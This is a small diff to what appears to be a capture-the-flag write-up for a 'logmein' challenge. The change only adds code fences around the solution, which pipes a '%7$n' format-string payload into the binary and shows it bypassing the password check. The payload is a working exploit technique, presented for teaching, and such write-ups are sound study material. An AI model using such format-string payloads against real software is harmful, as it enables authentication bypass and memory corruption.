@@ -77,12 +77,14 @@ Invalid login information.
 Now, the only thing left is to write to this value. This can be done by using the ```%n``` specifier. The (hexadecimal) value to the left of the specifier is written to the address specified.
 
 **Solution**
+```
 $ python2 -c 'print "123%7$n"' | ./logmein
 user = 0x15d3010
 Enter your username:
 Enter password for user: 123
 adsf
 Successfully logged in!
+```
 
 **Flag**
 ```
